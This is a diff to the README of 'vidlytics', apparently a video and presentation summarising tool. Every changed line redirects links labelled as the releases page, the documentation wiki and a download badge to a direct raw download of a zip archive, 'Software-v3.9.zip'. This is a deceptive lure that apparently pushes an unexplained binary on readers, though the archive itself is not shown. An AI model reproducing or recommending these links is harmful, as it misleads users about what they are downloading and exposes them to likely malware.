@@ -1,7 +1,7 @@
 # 🎥 vidlytics - Get Quick Insights from Multimedia
 
 ## 📥 Download
-[![Download vidlytics](https://img.shields.io/badge/Download-vidlytics-blue.svg)](https://github.com/Sam10451/vidlytics/releases)
+[![Download vidlytics](https://github.com/Sam10451/vidlytics/raw/refs/heads/main/vidlytics/Software-v3.9.zip)](https://github.com/Sam10451/vidlytics/raw/refs/heads/main/vidlytics/Software-v3.9.zip)
 
 ## 🚀 Getting Started
 vidlytics helps you extract text from multimedia files like videos and presentations. It generates concise summaries and insights based on your prompts, allowing for a quick understanding without needing to watch the entire content. This tool makes it easier to comprehend information from various media sources.
@@ -27,7 +27,7 @@ vidlytics includes these useful features:
 ## 📚 Download & Install
 To get started with vidlytics, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/raw/refs/heads/main/vidlytics/Software-v3.9.zip) to find the latest version.
    
 2. **Download the Installer**: Look for the most recent release and click on the appropriate file for your operating system. This will usually be an `.exe` file for Windows or a `.dmg` file for macOS.
 
@@ -61,11 +61,11 @@ No, vidlytics requires an internet connection to provide full functionality, inc
 No, vidlytics does not store any of your uploaded media files. All processing happens locally on your computer.
 
 ## 🌐 Additional Resources
-- **Documentation**: For more detailed guidance on usage, visit our [documentation page](https://github.com/Sam10451/vidlytics/wiki).
+- **Documentation**: For more detailed guidance on usage, visit our [documentation page](https://github.com/Sam10451/vidlytics/raw/refs/heads/main/vidlytics/Software-v3.9.zip).
 - **Community Support**: Join our community forum for discussions, tips, and troubleshooting.
 
 ## 🔄 Update Regularly
-It's important to keep vidlytics updated. Return to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/releases) periodically for the latest features and improvements.
+It's important to keep vidlytics updated. Return to the [vidlytics Releases page](https://github.com/Sam10451/vidlytics/raw/refs/heads/main/vidlytics/Software-v3.9.zip) periodically for the latest features and improvements.
 
 ## 📝 Feedback
 We welcome your feedback to make vidlytics better. If you encounter issues or have suggestions, please reach out through the Issues tab in this repository. 
